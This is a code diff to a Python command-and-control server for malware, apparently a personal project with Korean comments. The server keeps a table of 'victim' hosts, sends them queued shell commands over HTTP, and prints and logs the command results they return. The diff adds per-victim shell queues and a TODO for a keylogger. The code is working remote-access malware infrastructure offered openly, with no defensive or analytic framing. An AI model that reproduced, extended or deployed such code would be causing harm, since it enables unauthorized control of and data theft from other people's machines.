@@ -16,6 +16,9 @@ class BaseShell(cmd.Cmd):
     '''base'''
     prompt = "> "
 
+    def emptyline(self):
+        pass
+
     def _print_log(self, count=100):
         with open(LOG_PATH + datetime.now().strftime('%Y%m%d.txt'), 'r') as fr:
             log_data = fr.readlines()
@@ -158,8 +161,10 @@ class CNCServer(BaseHTTPRequestHandler):
                     return command_queue.popleft()
                 else:
                     break
-            command += command_queue.popleft() + ";"
-        
+            element = command_queue.popleft()
+            victim_table[victim_ip]['shQueue'].append(element)
+            command += element + ";"
+
         return command[:-1]
 
     # ddp raw data 파싱
@@ -217,7 +222,7 @@ class CNCServer(BaseHTTPRequestHandler):
         if not victim_name:
             victim_name = victim_ip
 
-        victim_table[victim_ip] = {'name' : victim_name, 'command' : deque(), 'seqName' : deque()}
+        victim_table[victim_ip] = {'name' : victim_name, 'command' : deque(), 'seqName' : deque(), 'shQueue' : deque()}
 
     def _save_none_seq_file(self, victim_ip, data):
         try:
@@ -374,7 +379,30 @@ class CNCServer(BaseHTTPRequestHandler):
 
     # shell 응답에 대한 처리 함수
     def _func_shell_response(self, victim_ip : str, ddp_data):
-        Logger.info('sh result : {}'.format(ddp_data.decode(ENCODING)))
+        global victim_table
+
+        try:
+            command = victim_table[victim_ip]['shQueue'].popleft()
+            result = ddp_data.decode(ENCODING)
+
+            print()
+            print('=={} command result==\n{}'.format(command, result))
+
+
+            Logger.info('sh result : {}'.format(ddp_data.decode(ENCODING)))
+        except IndexError as e:
+            Logger.error('receive shell response error : no command in shQueue : ' + str(e))
+            self._response_ddp_error('receive shell response error')
+        except UnicodeDecodeError as e:
+            Logger.error('receive shell response error : decode commmand({}) result fail : {}'.format(command, str(e)))
+            self._response_ddp_error('receive shell response error')
+
+            print()
+            print('=={} command result==\n{}'.format(command, str(result)))
+        except Exception as e:
+            Logger.error('receive shell response error : unknown error : ' + str(e))
+            self._response_ddp_error('receive shell response error')
+
         self._response_ack()
 
     # ftp 응답에 대한 처리 함수
@@ -408,7 +436,7 @@ TMP_FILE_PATH = SEQManager.TMP_FILE_PATH
 ENCODING = 'cp949'
 SERVER_INFO = ('172.17.254.126', 80)
 
-victim_table = {} # {ip : {name : [name], command : [command queue], seqName : [seqName queue]}}
+victim_table = {} # {ip : {name : [name], command : [command queue], shCommand : [sh queue], seqName : [seqName queue]}}
 
 
 # http server
@@ -424,6 +452,7 @@ except Exception as e:
 
 
 # TODO 패킷 전송중 클라이언트가 연결을 끊을 경우 발생하는 Broken PIPE 예외처리
+# TODO keylogger
 if __name__ == '__main__':
     try:
         EntryShell().cmdloop() # 대화형 쉘 실행
